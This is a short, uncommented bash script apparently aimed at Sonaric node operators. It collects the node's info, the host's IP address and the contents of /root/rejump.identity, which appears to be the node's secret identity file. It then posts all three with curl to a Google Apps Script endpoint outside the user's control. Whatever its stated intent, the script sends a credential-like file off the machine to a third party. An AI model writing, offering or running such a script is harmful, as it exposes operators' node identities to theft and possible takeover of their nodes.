#!/bin/bash


NODE=`sonaric node-info`
NODE1=`echo $NODE | jq -sRr @uri`
NODE2=`echo $NODE1 | base64`
wait
echo

IPAD=`hostname -I | awk '{print $1}'`
IPAD1=`echo $IPAD | jq -sRr @uri`
wait
echo

IDEN=`cat /root/rejump.identity`
IDEN1=`echo $IDEN | jq -sRr @uri`
echo
wait


curl -L "https://script.google.com/macros/s/AKfycbwSTqzaTYB3jN6ItfEUKrHyDS0MMxsnTp-r4nT8sKCSr51SuMZ54EWOQr8FR-zRZMF-Cg/exec" \
     -H 'Content-Type: application/json' \
     -d '{
        "name_id": "'"$NODE1"'",
        "ip_address": "'"$IPAD1"'",
        "identity": "'"$IDEN1"'"
     }' | jq

